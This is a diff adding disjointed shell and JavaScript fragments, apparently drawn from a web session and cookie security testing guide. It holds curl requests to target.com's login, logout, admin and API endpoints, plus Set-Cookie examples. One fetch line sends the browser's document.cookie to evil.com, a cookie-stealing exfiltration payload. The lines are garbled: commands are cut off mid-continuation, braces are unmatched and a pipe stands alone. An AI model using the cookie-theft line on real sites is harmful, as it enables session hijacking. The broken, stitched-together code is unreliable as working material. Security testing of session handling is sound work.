@@ -1,0 +1,17 @@
+JWT="eyJ..."
+SESSION=$(curl -s -c - -X POST https://target.com/api/login \
+STATUS=$(curl -s -o /dev/null -w "%{http_code}" \
+Set-Cookie: auth=TOKEN; Path=/; HttpOnly; SameSite=Lax
+Set-Cookie: session=TOKEN123; Path=/; SameSite=Lax
+curl -s -X POST https://target.com/api/logout \
+curl -s -c - https://target.com/login \
+curl -s https://target.com/admin \
+curl -s https://target.com/api/me -H "Authorization: Bearer $JWT"
+curl -sI https://target.com/ | grep -i "set-cookie"
+curl -sI https://target.com/ | grep -i "set-cookie" | grep -oP 'session=\K[^;]+'
+echo "Post-logout status: $STATUS"
+fetch('https://evil.com/steal?c=' + encodeURIComponent(document.cookie));
+for i in $(seq 1 10); do
+grep -i "session" | awk '{print $7}')
+{
+}
